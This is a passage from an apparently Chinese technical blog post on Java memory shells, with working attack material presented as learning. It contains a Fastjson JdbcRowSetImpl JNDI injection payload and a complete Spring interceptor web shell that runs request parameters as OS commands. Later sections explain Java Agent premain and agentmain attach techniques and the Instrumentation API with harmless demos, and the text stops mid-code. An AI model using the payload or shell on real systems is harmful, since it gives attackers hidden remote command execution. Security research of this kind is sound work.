plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap:&#x2F;&#x2F;127.0.0.1:1389&#x2F;test&quot;,&quot;autoCommit&quot;:true&#125;</span><br></pre></td></tr></table></figure>\n\n<p>获取恶意class成功</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/image-20220612010424694.png\" alt=\"image-20220612010424694\"></p>\n<p>注入成功</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/image-20220612010509711.png\" alt=\"image-20220612010509711\"></p>\n<h3 id=\"不出网-1\"><a href=\"#不出网-1\" class=\"headerlink\" title=\"不出网\"></a>不出网</h3><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.context.WebApplicationContext;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.context.request.RequestContextHolder;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.servlet.HandlerInterceptor;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.servlet.handler.AbstractHandlerMapping;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ShellInterceptor</span> <span class=\"keyword\">extends</span> <span class=\"title\">AbstractTranslet</span> <span class=\"keyword\">implements</span> <span class=\"title\">HandlerInterceptor</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">ShellInterceptor</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span> NoSuchFieldException, IllegalAccessException </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">// 1. 利用spring内部方法获取context</span></span><br><span class=\"line\">        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class=\"string\">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>,<span class=\"number\">0</span>);</span><br><span class=\"line\">        <span class=\"comment\">// 2. 从context中获取 RequestMappingHandlerMapping实例</span></span><br><span class=\"line\">        RequestMappingHandlerMapping abstractHandlerMapping  = context.getBean(RequestMappingHandlerMapping.class);</span><br><span class=\"line\">        <span class=\"comment\">// 3. 反射获取adaptedInterceptors属性</span></span><br><span class=\"line\">        java.lang.reflect.Field field = AbstractHandlerMapping.class.getDeclaredField(<span class=\"string\">&quot;adaptedInterceptors&quot;</span>);</span><br><span class=\"line\">        field.setAccessible(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">        java.util.ArrayList&lt;Object&gt; adaptedInterceptors = (java.util.ArrayList&lt;Object&gt;)field.get(abstractHandlerMapping);</span><br><span class=\"line\">        <span class=\"comment\">// 4. 避免重复添加</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = adaptedInterceptors.size() - <span class=\"number\">1</span>; i &gt; <span class=\"number\">0</span>; i--) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (adaptedInterceptors.get(i) <span class=\"keyword\">instanceof</span> ShellInterceptor) &#123;</span><br><span class=\"line\">                System.out.println(<span class=\"string\">&quot;已添加过&quot;</span>);</span><br><span class=\"line\">                <span class=\"keyword\">return</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        ShellInterceptor shellInterceptor = <span class=\"keyword\">new</span> ShellInterceptor(<span class=\"string\">&quot;aaa&quot;</span>);</span><br><span class=\"line\">        adaptedInterceptors.add(shellInterceptor);</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">ShellInterceptor</span><span class=\"params\">(String tmp)</span></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">boolean</span> <span class=\"title\">preHandle</span><span class=\"params\">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">        String code = request.getParameter(<span class=\"string\">&quot;code&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(code != <span class=\"keyword\">null</span>)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                java.io.PrintWriter writer = response.getWriter();</span><br><span class=\"line\">                String o = <span class=\"string\">&quot;&quot;</span>;</span><br><span class=\"line\">                ProcessBuilder p;</span><br><span class=\"line\">                <span class=\"keyword\">if</span>(System.getProperty(<span class=\"string\">&quot;os.name&quot;</span>).toLowerCase().contains(<span class=\"string\">&quot;win&quot;</span>))&#123;</span><br><span class=\"line\">                    p = <span class=\"keyword\">new</span> ProcessBuilder(<span class=\"keyword\">new</span> String[]&#123;<span class=\"string\">&quot;cmd.exe&quot;</span>, <span class=\"string\">&quot;/c&quot;</span>, code&#125;);</span><br><span class=\"line\">                &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">                    p = <span class=\"keyword\">new</span> ProcessBuilder(<span class=\"keyword\">new</span> String[]&#123;<span class=\"string\">&quot;/bin/sh&quot;</span>, <span class=\"string\">&quot;-c&quot;</span>, code&#125;);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                java.util.Scanner c = <span class=\"keyword\">new</span> java.util.Scanner(p.start().getInputStream()).useDelimiter(<span class=\"string\">&quot;\\\\A&quot;</span>);</span><br><span class=\"line\">                o = c.hasNext() ? c.next(): o;</span><br><span class=\"line\">                c.close();</span><br><span class=\"line\">                writer.write(o);</span><br><span class=\"line\">                writer.flush();</span><br><span class=\"line\">                writer.close();</span><br><span class=\"line\">            &#125;<span class=\"keyword\">catch</span> (Exception e)&#123;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">false</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">true</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">transform</span><span class=\"params\">(DOM document, SerializationHandler[] handlers)</span> <span class=\"keyword\">throws</span> TransletException </span>&#123;</span><br><span class=\"line\">    </span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">transform</span><span class=\"params\">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class=\"keyword\">throws</span> TransletException </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> NoSuchFieldException, IllegalAccessException </span>&#123;</span><br><span class=\"line\">        ShellInterceptor shellInterceptor = <span class=\"keyword\">new</span> ShellInterceptor();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"参考-1\"><a href=\"#参考-1\" class=\"headerlink\" title=\"参考\"></a>参考</h3><p><a href=\"https://www.cnblogs.com/bitterz/p/14859766.html\">针对Spring MVC的Interceptor内存马 - bitterz</a></p>\n<p><a href=\"https://myzxcg.com/2021/11/Spring-%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0/#\">Spring 内存马实现 | MYZXCG</a></p>\n<h1 id=\"基于Javaagent和Javassist技术\"><a href=\"#基于Javaagent和Javassist技术\" class=\"headerlink\" title=\"基于Javaagent和Javassist技术\"></a>基于Javaagent和Javassist技术</h1><p>深入了解学习从agent中instrument的从加载到hook的流程参考：<a href=\"https://www.mi1k7ea.com/2020/05/10/%E6%B5%85%E6%9E%90Java-Instrument%E6%8F%92%E6%A1%A9%E6%8A%80%E6%9C%AF/\">浅析Java Instrument插桩技术  Mi1k7ea </a></p>\n<h2 id=\"Java-Agent-简介\"><a href=\"#Java-Agent-简介\" class=\"headerlink\" title=\"Java Agent 简介\"></a>Java Agent 简介</h2><p>在 jdk 1.5 之后引入了 java.lang.instrument 包，该包提供了检测 java 程序的 Api，比如用于监控、收集性能信息、诊断问题，<strong>通过 java.lang.instrument 实现的工具我们称之为 Java Agent</strong> ，Java Agent 能够在不影响正常编译的情况下来修改字节码，即 <strong>动态修改已加载或者未加载的类，包括类的属性、方法</strong>。从 JDK 1.6 开始支持更加强大的动态 Instrument，在JVM 启动后通过 Attach(pid) 远程加载。也就是说instrument它 <strong>能干的事就是动态修改未加载，已加载，正在加载的类</strong></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/java-agent-mindmap.png\"></p>\n<p>那么 java.lang.instrument 包的具体实现，依赖于 JVMTI。</p>\n<blockquote>\n<p>JVMTI（Java Virtual Machine Tool Interface）是一套由 Java 虚拟机提供的，为 JVM 相关的工具提供的本地编程接口集合。JVMTI 提供了一套 “代理” 程序机制，可以支持第三方工具程序以代理的方式连接和访问 JVM，并利用 JVMTI 提供的丰富的编程接口，完成很多跟 JVM 相关的功能。</p>\n</blockquote>\n<p>事实上，java.lang.instrument 包的实现，也就是基于这种机制的：<strong>在 Instrumentation 的实现当中，存在一个 JVMTI 的代理程序，通过调用 JVMTI 当中 Java 类相关的函数来完成 Java 类的动态操作</strong>。除开 Instrumentation 功能外，JVMTI 还在虚拟机内存管理，线程控制，方法和变量操作等等方面提供了大量有价值的函数。</p>\n<h2 id=\"Java-Agent的运行实现\"><a href=\"#Java-Agent的运行实现\" class=\"headerlink\" title=\"Java Agent的运行实现\"></a>Java Agent的运行实现</h2><p>Java Agent通过指定一个特定的jar包，不能单独启动，必须依附一个java应用程序运行，其运行实现有两种方式：</p>\n<p>一种是premain,一种是agentmain</p>\n<ul>\n<li>jvm方式：实现 <strong>premain</strong>方法，在JVM启动前加载。// jvm 参数形式启动，jdk 1.5之后</li>\n<li>attach方法：实现 <strong>agentmain</strong>方法，在JVM启动后加载。// 动态 attach 方式启动，jdk 1.6之后</li>\n</ul>\n<p>其中 jvm方式，也就是说要使用这个 agent 的目标应用，在启动的时候，需要指定 jvm 参数-javaagent:xxx.jar。而当目标应用程序启动之后，没有添加 -javaagent 加载我们的 agent，但我们希望目标程序使用我们的 agent，这时候就可以使用 attach 方式来使用。</p>\n<h3 id=\"premain\"><a href=\"#premain\" class=\"headerlink\" title=\"premain\"></a>premain</h3><p>hello.java</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">hello</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        Hello();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">Hello</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">0</span>;i&lt;<span class=\"number\">10</span>;i++)&#123;</span><br><span class=\"line\">            System.out.println(<span class=\"string\">&quot;hello world&quot;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">try</span>&#123;</span><br><span class=\"line\">            Thread.sleep(<span class=\"number\">1000</span>);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (InterruptedException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>premain.java</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> java.lang.instrument.Instrumentation;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">premain</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">premain</span><span class=\"params\">(String args, Instrumentation inst)</span> <span class=\"keyword\">throws</span> Exception</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">3</span>; i++) &#123;</span><br><span class=\"line\">            System.out.println(<span class=\"string\">&quot;premain agent!!!&quot;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>src目录下创建META-INF/MANIFEST.MF</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">Manifest-Version: 1.0</span><br><span class=\"line\">Premain-Class: premain</span><br><span class=\"line\">Can-Redefine-Classes: true</span><br><span class=\"line\">Can-Retransform-Classes: true</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>生成两个jar文件，通过 <strong>-javaagent</strong> 来执行：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">java -javaagent:premain.jar -jar hello.jar</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/image-20220614164507437.png\" alt=\"image-20220614164507437\"></p>\n<p>但是利用起来可能就比较鸡肋，无法控制项目重启以达到加载恶意jar的目的</p>\n<h3 id=\"agentmain\"><a href=\"#agentmain\" class=\"headerlink\" title=\"agentmain\"></a>agentmain</h3><p>这个就比较符合利用了，虽然项目已经启动，利用attach技术，将agent注入到目标代码中，着重关注的是 <strong>VitualMachine</strong> 这个类</p>\n<blockquote>\n<p>字面意义表示一个Java 虚拟机，也就是程序需要监控的目标虚拟机，提供了 <strong>获取系统信息、 loadAgent，Attach 和 Detach 等方法</strong>，可以实现的功能可以说非常之强大 。该类允许我们通过给attach方法传入一个jvm的pid(进程id)，远程连接到jvm上 。代理类注入操作只是它众多功能中的一个，通过 <strong>loadAgent</strong> 方法向jvm注册一个代理程序agent，在该agent的代理程序中会得到一个Instrumentation 实例。</p>\n</blockquote>\n<p>test.java</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">test</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        Hello();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">Hello</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">0</span>;i&lt;<span class=\"number\">20</span>;i++)&#123;</span><br><span class=\"line\">            System.out.println(<span class=\"string\">&quot;hello world&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">try</span>&#123;</span><br><span class=\"line\">            Thread.sleep(<span class=\"number\">1000</span>);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (InterruptedException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>hello.java</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> com.sun.tools.attach.*;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.IOException;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.List;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">hello</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> AgentLoadException, IOException, AttachNotSupportedException, AgentInitializationException </span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;running JVM start&quot;</span>);</span><br><span class=\"line\">        List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();</span><br><span class=\"line\">        String agent = <span class=\"string\">&quot;agentmain.jar&quot;</span>;</span><br><span class=\"line\">        Integer i=<span class=\"number\">0</span>;</span><br><span class=\"line\">        String aim = <span class=\"string\">&quot;test.jar&quot;</span>;<span class=\"comment\">//你的jar包</span></span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;[+]Finding: &quot;</span>+aim);</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;[+]Agent jar: &quot;</span>+agent);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">for</span> (VirtualMachineDescriptor vmd : list) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">if</span> (vmd.displayName().contains(aim)) &#123;</span><br><span class=\"line\">                System.out.println(String.format(<span class=\"string\">&quot;[+]find %s, process id %s&quot;</span>, vmd.displayName(), vmd.id()));</span><br><span class=\"line\"></span><br><span class=\"line\">                VirtualMachine virtualMachine = VirtualMachine.attach(vmd.id());  <span class=\"comment\">// 进程id号</span></span><br><span class=\"line\">                virtualMachine.loadAgent(agent);<span class=\"comment\">//你想要加载的agentmain包  loadAgent</span></span><br><span class=\"line\">                virtualMachine.detach();</span><br><span class=\"line\">                <span class=\"keyword\">break</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>agentmain.java</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> java.lang.instrument.Instrumentation;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">agentmain</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">agentmain</span><span class=\"params\">(String agentArgs, Instrumentation inst)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">3</span>; i++) &#123;</span><br><span class=\"line\">            System.out.println(<span class=\"string\">&quot;agentmain agent!!!&quot;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>src目录下创建META-INF/MANIFEST.MF</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">Manifest-Version: 1.0</span><br><span class=\"line\">Agent-Class: agentmain</span><br><span class=\"line\">Can-Redefine-Classes: true</span><br><span class=\"line\">Can-Retransform-Classes: true</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>执行，成功注入到正在运行的hello.jar中</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">java -jar hello.jar</span><br><span class=\"line\">java -jar test.jar</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/image-20220614183827076.png\" alt=\"image-20220614183827076\"></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/image-20220614183806947.png\" alt=\"image-20220614183806947\"></p>\n<h2 id=\"Instrumentation\"><a href=\"#Instrumentation\" class=\"headerlink\" title=\"Instrumentation\"></a>Instrumentation</h2><p>JavaAgent技术进行类的字节码修改最主要使用的就是 Java Instrumentation，它是 Java 提供的监测运行在 JVM 程序的 API</p>\n<p><strong>原理</strong></p>\n<blockquote>\n<p>instrument 的底层实现依赖于 JVMTI ，也就是 JVM Tool Interface ，它是 JVM 暴露出来的一些供用户扩展的接口集合， JVMTI 是基于事件驱动的， JVM 每执行到一定的逻辑就会调用一些事件的回调接口（如果有的话），这些接口可以供开发者去扩展自己的逻辑。 JVMTIAgent 是一个利用 JVMTI 暴露出来的接口提供了代理启动时加载(agent on load)、代理通过 attach 形式加载(agent on attach)和代理卸载(agent on unload)功能的动态库。而 instrument agent 可以理解为一类 JVMTIAgent 动态库，别名是 JPLISAgent (Java Programming Language Instrumentation Services Agent)，也就是专门为 Java 语言编写的插桩服务提供支持的代理。</p>\n</blockquote>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/image-20220615185513337.png\" alt=\"image-20220615185513337\"></p>\n<p>那么来看一下 Instrumentation 给我们提供了什么</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/image-20220617141353158.png\" alt=\"image-20220617141353158\"></p>\n<p>这里列出实现的函数</p>\n<table>\n<thead>\n<tr>\n<th align=\"left\">类方法</th>\n<th>功能</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"left\">void addTransformer(ClassFileTransformer transformer, boolean canRetransform)</td>\n<td>添加一个 Transformer，是否允许 reTransformer</td>\n</tr>\n<tr>\n<td align=\"left\">boolean removeTransformer(ClassFileTransformer transformer)</td>\n<td>移除一个 Transformer</td>\n</tr>\n<tr>\n<td align=\"left\">boolean isRetransformClassesSupported()</td>\n<td>检测是否允许 reTransformer</td>\n</tr>\n<tr>\n<td align=\"left\">void retransformClasses(Class&lt;?&gt;… classes)</td>\n<td>重加载（retransform）类</td>\n</tr>\n<tr>\n<td align=\"left\">boolean isModifiableClass(Class&lt;?&gt; theClass)</td>\n<td>确定一个类是否可以被 retransformation 或 redefinition 修改</td>\n</tr>\n<tr>\n<td align=\"left\">Class[] getAllLoadedClasses()</td>\n<td>获取 JVM 当前加载的所有类</td>\n</tr>\n<tr>\n<td align=\"left\">Class[] getInitiatedClasses(ClassLoader loader)</td>\n<td>获取指定类加载器下所有已经初始化的类</td>\n</tr>\n<tr>\n<td align=\"left\">long getObjectSize(Object objectToSize)</td>\n<td>返回指定对象大小</td>\n</tr>\n<tr>\n<td align=\"left\">void appendToBootstrapClassLoaderSearch(JarFile jarfile)</td>\n<td>添加到 BootstrapClassLoader 搜索</td>\n</tr>\n<tr>\n<td align=\"left\">void appendToSystemClassLoaderSearch(JarFile jarfile)</td>\n<td>添加到 SystemClassLoader 搜索</td>\n</tr>\n<tr>\n<td align=\"left\">boolean isNativeMethodPrefixSupported()</td>\n<td>是否支持设置 native 方法 Prefix</td>\n</tr>\n<tr>\n<td align=\"left\">void setNativeMethodPrefix(ClassFileTransformer transformer, String prefix)</td>\n<td>通过允许重试，将前缀应用到名称，此方法修改本机方法解析的失败处理</td>\n</tr>\n<tr>\n<td align=\"left\">boolean isRedefineClassesSupported()</td>\n<td>是否支持类 redefine</td>\n</tr>\n<tr>\n<td align=\"left\">void redefineClasses(ClassDefinition… definitions)</td>\n<td>重定义（redefine）类</td>\n</tr>\n</tbody></table>\n<p>重点讲两个 <strong>addTransformer、retransformClasses</strong></p>\n<p>一、addTransformer 有两种，带 canRetransform 参数的指明是否允许重新转换，共有的参数为 <strong>ClassFileTransformer</strong> 类型的class文件转换器</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/image-20220617170017299.png\" alt=\"image-20220617170017299\"></p>\n<p>该 ClassFileTransformer 有一个transform 方法需要用户自己自定义实现，这里也是利用javassist技术进行修改字节码的地方</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/image-20220617170508953.png\" alt=\"image-20220617170508953\"></p>\n<p>二、retransformClasses </p>\n<p>retransformClasses 方法能对已加载的 class 进行重新定义，也就是说如果我们的目标类已经被加载的话，我们可以调用该函数，来重新触发这个Transformer的拦截，以此达到对已加载的类进行字节码修改的效果</p>\n<h2 id=\"Instrument流程\"><a href=\"#Instrument流程\" class=\"headerlink\" title=\"Instrument流程\"></a>Instrument流程</h2><p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/image-20220617153737730.png\" alt=\"image-20220617153737730\"></p>\n<ol>\n<li>在JVM启动时，通过JVM参数-javaagent，传入agent jar，Instrument Agent被加载，调用其Agent_OnLoad函数；</li>\n<li>在Instrument Agent 初始化时，注册了JVMTI初始化函数eventHandlerVMinit；</li>\n<li>在JVM启动时，会调用初始化函数eventHandlerVMinit，启动了Instrument Agent；</li>\n<li>用sun.instrument.instrumentationImpl类里的方法 <strong>loadClassAndCallPremain</strong> 方法去初始化Premain-Class指定类的premain方法。初始化函数eventHandlerVMinit，注册了class解析的ClassFileLoadHook函数；</li>\n<li>调用应用程序的main开始执行，准备解析；</li>\n<li>解析Class之前，JVM调用JVMTI的<strong>ClassFileLoadHook</strong>函数，钩子函数调用sun.instrument.instrumentationImpl类里的transform方法，通过TransformerManager的transformer方法最终调用我们自定义的Transformer类的transform方法；</li>\n<li>因为字节码在解析Class之前改的，直接使用修改后的字节码的数据流替代，最后进入Class解析，对整个Class解析无影响；</li>\n<li>重新加载Class依然重新走6-7步骤；</li>\n</ol>\n<p>先给出例子，其中利用的 javassist 下面进行学习</p>\n<p>hello.jar</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// HelloWorld.java</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.Scanner;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">HelloWorld</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span></span>&#123;</span><br><span class=\"line\">        hello h1 = <span class=\"keyword\">new</span> hello();</span><br><span class=\"line\">        h1.hello();</span><br><span class=\"line\">        <span class=\"comment\">// 产生中断，等待注入</span></span><br><span class=\"line\">        Scanner sc = <span class=\"keyword\">new</span> Scanner(System.in);</span><br><span class=\"line\">        sc.nextInt();</span><br><span class=\"line\">        hello h2 = <span class=\"keyword\">new</span> hello();</span><br><span class=\"line\">        h2.hello();</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;ends...&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// hello.java</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">hello</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">hello</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;hello world&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>agent.jar</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// AgentDemo.java</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.instrument.Instrumentation;</span><br><span class=\"line\"><span class=\"keyword\">import</span> 